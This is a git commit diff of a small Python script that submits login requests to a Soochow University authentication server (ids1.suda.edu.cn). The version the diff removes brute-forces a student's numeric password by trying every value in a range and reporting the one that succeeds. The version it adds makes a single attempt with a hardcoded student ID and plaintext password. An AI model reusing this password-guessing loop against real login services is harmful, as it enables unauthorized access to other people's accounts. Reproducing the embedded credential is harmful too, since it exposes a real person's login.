4756fdb3b37169a37b630990fe8a9fd8643b4bf6
cuzzing <donganqi@foxmail.com>
2016-07-17 11:02:11 +0800

    delete

--- cjlrLogin.py
+++ cjlrLogin.py
@@ -12,27 +12,27 @@ def md5(str):
 
 IDToken1 = '1430705000'         #学号
 # IDToken9 = 'xxxxxx'                   #密码
-for IDToken9 in range(970000, 971231):
+IDToken9 = 'xh5077'
+IDToken2 = md5(str(IDToken9))         #密码的md5值
 
-    IDToken2 = md5(str(IDToken9))         #密码的md5值
+payload = {'IDButton': 'Submit',
+            'encoded': 'false',
+            'goto': '',
+            'gx_charset': 'UTF-8',
+            'IDToken0': '',
+            'IDToken1': IDToken1,
+            'IDToken9': IDToken9,
+            'IDToken2': IDToken2}
+url = 'http://ids1.suda.edu.cn/amserver/UI/Login?goto=http://myauth.suda.edu.cn/default.aspx?app=cjlr'
 
-    payload = {'IDButton': 'Submit',
-                'encoded': 'false',
-                'goto': '',
-                'gx_charset': 'UTF-8',
-                'IDToken0': '',
-                'IDToken1': IDToken1,
-                'IDToken9': IDToken9,
-                'IDToken2': IDToken2}
-    url = 'http://ids1.suda.edu.cn/amserver/UI/Login?goto=http://myauth.suda.edu.cn/default.aspx?app=cjlr'
+res = requests.post(url, data = payload)
 
-    res = requests.post(url, data = payload)
-
-    soup = BeautifulSoup(res.text)
-    isEmpty = soup.find('td', attrs={'style': 'font-weight:bold; font-size:14px'})
-    if isEmpty != None:
-        print(str(IDToken9) + isEmpty.getText().strip())
-    else:
-        # print(res.text)
-        print(str(IDToken9) + ' is right!')
-        break
+soup = BeautifulSoup(res.text)
+isEmpty = soup.find('td', attrs={'style': 'font-weight:bold; font-size:14px'})
+print(res.url)
+print(res.history)
+if isEmpty != None:
+    print(str(IDToken9) + isEmpty.getText().strip())
+else:
+    # print(res.text)
+    print(str(IDToken9) + ' is right!')
